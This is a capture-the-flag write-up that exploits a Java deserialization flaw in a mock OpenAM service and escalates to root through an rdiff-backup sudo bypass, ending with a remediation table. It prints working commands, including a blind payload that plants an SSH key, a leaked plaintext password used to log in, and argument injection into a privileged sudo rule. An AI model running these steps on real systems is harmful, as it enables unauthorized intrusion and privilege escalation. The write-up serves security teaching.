# Djaradjara — Java deserialization to root via rdiff-backup

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/djaradjara/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A mock OpenAM 16.0.5 JATO service deserializes the
> `jato.clientSession` parameter with a bare `ObjectInputStream`
> (CVE-2026-33439). The public exploit works only after its `EvilTranslet`
> bytecode is rebuilt for Java 8. RCE as `openam` gives SSH; `owen`'s password
> leaks in the container entrypoint; and a sudo rule for `rdiff-backup --server
> --restrict-path /opt/backup ... *` is bypassed by appending a second
> `--restrict-path /`, letting root copy `/root/flag.txt` out. Flag:
> `NCTF{4cc3…}`.


## 1. Briefing

### Description
An OpenAM 16.0.5 login portal ("Forgot your password? No problem.") that is
actually a `JatoServer` impersonation on port 8080.

### Target
| Field | Value |
|-------|-------|
| Host | `10.100.13.100:8080` (ephemeral lab) |
| Flag format | `NCTF{...}` |

## 2. Reconnaissance

The banner and readable source at `/opt/djaradjara/jato/JatoServer.java` expose
the sink:

```java
String cs = parseParam(query, "jato.clientSession");
byte[] blob = urlsafeDecode(cs);
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(blob))) {
    ois.readObject(); // RCE
}
```

A bare `ObjectInputStream.readObject()` on request input is the classic Java
deserialization RCE (CVE-2026-33439).

## 3. Analysis

The public PoC fails as-is: it compiles `EvilTranslet` with the build JDK,
producing a class-file version (65+) the target JVM cannot load. Recompiling the
translet with `--release 8` fixes the gadget chain. The service deserializes on
**any** path and always returns the same 133-byte decoy, so RCE is blind —
confirm it with a timing payload or an out-of-band action (SSH key install).

## 4. Exploitation

### Step 1 — fix the PoC's JVM mismatch, get a foothold

```python
# build.py patch — compile the translet for Java 8
def javac(classpath, source_path):
    args = ["javac", "-cp", classpath]
    if source_path.endswith("EvilTranslet.java"):
        args += ["--release", "8"]
    args.append(source_path)
    subprocess.run(args, capture_output=True)
```

```bash
# Blind payload runs as openam and installs our SSH key
KEY='ssh-ed25519 AAAA...<attacker key>'
CMD="mkdir -p /opt/djaradjara/.ssh; printf '%s\n' \"$KEY\" >> /opt/djaradjara/.ssh/authorized_keys; chmod 700 /opt/djaradjara/.ssh; chmod 600 /opt/djaradjara/.ssh/authorized_keys"
python3 build.py --command "$CMD"
curl -s "http://10.100.13.100:8080/?jato.clientSession=$(cat payload.b64)"
ssh -i key openam@10.100.13.100
```

### Step 2 — pivot openam → owen

The readable entrypoint leaks the next user's password:

```bash
# /usr/local/bin/djaradjara-entrypoint
#   2. SSH  (owen / Djar4Djar4_R00t_S3cret!)
sshpass -p 'Djar4Djar4_R00t_S3cret!' ssh owen@10.100.13.100 'sudo -l'
# (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

### Step 3 — rdiff-backup restrict-path bypass → root

The trailing `*` allows extra arguments, and `rdiff-backup`'s parser keeps the
**last** value of a repeated option. Appending a second `--restrict-path /`
widens the privileged server's restriction from `/opt/backup` to `/`:

```bash
SCHEMA='sudo -n /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-only #%s'
rm -rf /tmp/loot
/usr/bin/rdiff-backup --remote-schema "$SCHEMA" fake::/root /tmp/loot
cat /tmp/loot/flag.txt   # flag file is /root/flag.txt, not root.txt
```

## 5. Flag

```
NCTF{4cc3…}
```

## 6. Dead ends & troubleshooting
- The upstream PoC silently produces a class file the target JVM rejects — the
  service just returns its decoy, so it looks like the bug is patched. The
  `--release 8` rebuild is the whole trick.
- The flag is `/root/flag.txt`, not the usual `root.txt`.

## 7. Lessons & remediation
| Weakness | Root cause | Fix |
|----------|-----------|-----|
| RCE | `ObjectInputStream.readObject()` on untrusted input | Remove native Java deserialization of request data; use a safe format with a strict schema |
| Lateral movement | Plaintext password in a readable entrypoint | Keep secrets out of images/scripts; use a secrets manager |
| Privesc | Sudo rule ending in `*` on a tool with repeatable options | Pin exact arguments in sudoers; never allow trailing wildcards on backup/restore tools |
